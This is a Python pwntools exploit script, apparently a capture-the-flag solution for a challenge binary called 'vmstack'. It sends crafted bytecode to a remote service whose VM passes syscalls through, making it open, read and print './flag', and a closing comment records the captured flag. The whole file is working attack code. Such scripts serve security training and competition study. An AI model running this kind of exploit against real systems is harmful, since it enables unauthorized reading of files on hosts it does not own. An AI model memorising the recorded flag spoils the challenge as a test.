from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('vmstack')
io = remote('129.211.173.64', 10001)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('vmstack')


def push_imm64(num):
    return p8(0) + p64(num)


def push_reg(index):
    return p8(index + 1)


def pop_reg(index):
    return p8(index + 5)


def syscall():
    return p8(0xc)


def pwn():
    code = b''
    # brk(0x560000000000)
    code += push_imm64(0xc)
    code += pop_reg(1)
    code += push_imm64(0x560000000000)
    code += pop_reg(2)
    code += syscall()
    code += push_reg(0)
    # *my_rsp -= 0x1000
    code += p8(0xb) + p64(0x1000)
    # read(0, filename, 8)
    code += push_imm64(0)
    code += pop_reg(1)
    code += push_imm64(0)
    code += pop_reg(2)
    code += pop_reg(3)
    code += push_imm64(8)
    code += pop_reg(4)
    code += syscall()
    # open(filename, 0, 0)
    code += push_reg(3)
    code += push_imm64(2)
    code += pop_reg(1)
    code += pop_reg(2)
    code += push_imm64(0)
    code += pop_reg(3)
    code += push_imm64(0)
    code += pop_reg(4)
    code += syscall()
    # read(4, buf, 0x40)
    code += push_reg(2)
    code += push_imm64(0)
    code += pop_reg(1)
    code += push_imm64(4)
    code += pop_reg(2)
    code += pop_reg(3)
    code += push_imm64(0x40)
    code += pop_reg(4)
    code += syscall()
    # write(1, buf, 0x40)
    code += push_imm64(1)
    code += pop_reg(1)
    code += push_imm64(1)
    code += pop_reg(2)
    code += syscall()
    # gdb.attach(io)
    io.sendlineafter('Input your op code:\n', code)
    io.sendafter('Solving starting...\n', b'./flag\x00')
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()


# flag{ec322378ed804bdfc315002e9853c0e6}
